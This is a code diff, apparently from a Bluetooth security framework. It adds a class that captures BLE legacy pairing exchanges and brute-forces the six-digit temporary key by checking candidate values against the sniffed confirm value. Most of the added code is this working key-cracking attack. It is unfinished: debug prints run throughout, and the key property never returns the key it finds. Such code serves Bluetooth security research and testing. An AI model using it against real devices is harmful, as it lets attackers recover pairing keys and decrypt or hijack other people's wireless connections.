@@ -4,7 +4,11 @@ from Cryptodome.Random import get_random_bytes
 from cryptography.hazmat.primitives.asymmetric.ec import SECP256R1, \
     generate_private_key, derive_private_key, EllipticCurvePublicNumbers, \
     ECDH
-from scapy.layers.bluetooth4LE import LL_ENC_REQ, LL_ENC_RSP, LL_START_ENC_REQ, BTLE_CTRL, BTLE_DATA, BTLE
+from scapy.layers.bluetooth4LE import LL_ENC_REQ, LL_ENC_RSP, LL_START_ENC_REQ, \
+    BTLE_CTRL, BTLE_DATA, BTLE, BTLE_CONNECT_REQ
+from scapy.layers.bluetooth import SM_Hdr, SM_Pairing_Request, SM_Random, \
+    SM_Pairing_Response, SM_Confirm
+from whad.ble.bdaddr import BDAddress
 from whad.protocol.ble.ble_pb2 import BleDirection
 from whad.ble.exceptions import MissingCryptographicMaterial
 from struct import pack
@@ -379,3 +383,91 @@ class LinkLayerDecryptor:
                 return (decrypted_packet, True)
             else:
                 return (None, False)
+
+class LegacyPairingCracking:
+        def __init__(
+            self,
+            initiator = None,
+            responder = None,
+            pairing_req = None,
+            pairing_rsp = None,
+            confirm = None,
+            random = None
+        ):
+
+            self.initiator = initiator
+            self.responder = responder
+
+            self.pairing_req = pairing_req
+            self.pairing_rsp = pairing_rsp
+            self.confirm = confirm
+            self.random = random
+
+        def process_packet(self, pkt):
+            if BTLE_CONNECT_REQ in pkt:
+                self.initiator = BDAddress(pkt.InitA, random=pkt.TxAdd == 1)
+                self.responder = BDAddress(pkt.AdvA, random=pkt.RxAdd == 1)
+
+            elif SM_Pairing_Request in pkt:
+                self.pairing_req = bytes(pkt[SM_Hdr].build()) # why scapy why
+                print("preq", self.pairing_req)
+
+            elif SM_Pairing_Response in pkt:
+                self.pairing_rsp = bytes(pkt[SM_Hdr].build())
+                print("prsp", self.pairing_rsp)
+
+            elif SM_Confirm in pkt and self.confirm is None:
+                self.confirm = bytes(pkt.confirm)
+                print("confirm", self.confirm)
+
+            elif SM_Random in pkt and self.random is None:
+                self.random = bytes(pkt.random)
+                print("random", self.random)
+
+        def process_connected(self, initiator, responder):
+            self.initiator = initiator
+            self.responder = responder
+
+        # Harmonize this into Traffic Analyzer class, we CAN'T run a bruteforce every time a packet is processed
+        @property
+        def ready(self):
+            return (
+                self.initiator is not None and
+                self.responder is not None and
+                self.pairing_req is not None and
+                self.pairing_rsp is not None and
+                self.confirm is not None and
+                self.random is not None
+            )
+
+        @property
+        def key(self):
+            xor = lambda a1, b1: bytes([a ^ b for a,b in zip(a1,b1)])
+            for i in range(0,1000000):
+                tk = pack(">IIII", 0,0,0,i)
+                print(tk.hex())
+                p1 = self.pairing_rsp[::-1] + self.pairing_req[::-1] + (
+                    (b"\x01" if self.responder.is_random() else b"\x00") +
+                    (b"\x01" if self.initiator.is_random() else b"\x00")
+                )
+                print(self.initiator.value.hex(), self.responder.value.hex())
+                p2 = b"\x00\x00\x00\x00" + self.initiator.value[::-1] + self.responder.value[::-1]
+                print("p1", p1.hex(), "p2", p2.hex())
+
+                a = xor(p1, self.random[::-1])
+                aes = AES.new(tk, AES.MODE_ECB)
+                res1 = aes.encrypt(a)
+                b = xor(res1, p2)
+                res2 = aes.encrypt(b)
+                print(res2.hex(), self.confirm[::-1].hex())
+                if res2 == self.confirm[::-1]:
+                    print("success", i)
+                    break
+
+        def reset(self):
+            self.initiator = None
+            self.responder = None
+
+            self.pairing_req = None
+            self.pairing_rsp = None
+            self.confirm = None
